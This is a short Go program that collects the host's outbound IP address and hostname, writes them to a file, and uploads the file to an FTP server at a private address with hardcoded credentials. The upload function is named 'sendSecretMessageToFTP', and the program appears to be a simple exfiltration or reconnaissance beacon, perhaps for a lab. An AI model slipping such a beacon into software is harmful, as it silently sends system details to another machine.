package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"time"

	"github.com/secsy/goftp"
)

// Get preferred outbound ip of this machine
// Recovered from: https://stackoverflow.com/questions/23558425/how-do-i-get-the-local-ip-address-in-go
func GetOutboundIP() net.IP {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	log.Printf("IP: %s", localAddr.IP.String())
	return localAddr.IP
}

func GetHostname() string {
	// Recovered from: https://www.cloudhadoop.com/2018/12/golang-examples-hostname-and-ip-address.html
	hostname, error := os.Hostname()
	if error != nil {
		log.Fatal(error)
	}
	log.Printf("Hostname: %s", hostname)
	return hostname

}

func sendSecretMessageToFTP(output_message *string) {

	config := goftp.Config{
		User:               "remote_user",
		Password:           "Password",
		ConnectionsPerHost: 10,
		Timeout:            10 * time.Second,
		Logger:             os.Stderr,
	}

	client, err := goftp.DialConfig(config, "192.168.1.45:21")
	if err != nil {
		panic(err)
	}

	log.Println("Opening File ...")

	output_filename := "ip_host.txt"

	output_file, err := os.Create(output_filename)
	if err != nil {
		log.Fatal(err)
	}

	defer output_file.Close()
	_, err2 := output_file.WriteString(*output_message)
	if err2 != nil {
		log.Fatal(err2)
	}

	output_file, err = os.Open(output_filename)
	if err != nil {
		panic(err)
	}

	// Upload a file from disk
	log.Println("Sending File ...")
	err = client.Store("/usuario_remoto/output_file.txt", output_file)
	if err != nil {
		panic(err)
	}
}

func main() {

	ip := GetOutboundIP()
	hostname := GetHostname()
	output_message := fmt.Sprintf("Hostname: %s - IP: %s", hostname, ip.String())

	sendSecretMessageToFTP(&output_message)

	/*
		// FTP Connection
		config := goftp.Config{
			User:               "remote_user",
			Password:           "Password",
			ConnectionsPerHost: 10,
			Timeout:            10 * time.Second,
			Logger:             os.Stderr,
		}


		client, err := goftp.DialConfig(config, "192.168.1.45:21")
		if err != nil {
			panic(err)
		}

		log.Println("Opening File ...")

		output_filename := "ip_host.txt"

		output_file, err := os.Create(output_filename)
		if err != nil {
			log.Fatal(err)
		}

		defer output_file.Close()
		_, err2 := output_file.WriteString(output_message)
		if err2 != nil {
			log.Fatal(err2)
		}

		output_file, err = os.Open(output_filename)
		if err != nil {
			panic(err)
		}

		// Upload a file from disk
		log.Println("Sending File ...")
		err = client.Store("/usuario_remoto/output_file.txt", output_file)
		if err != nil {
			panic(err)
		}
	*/

}
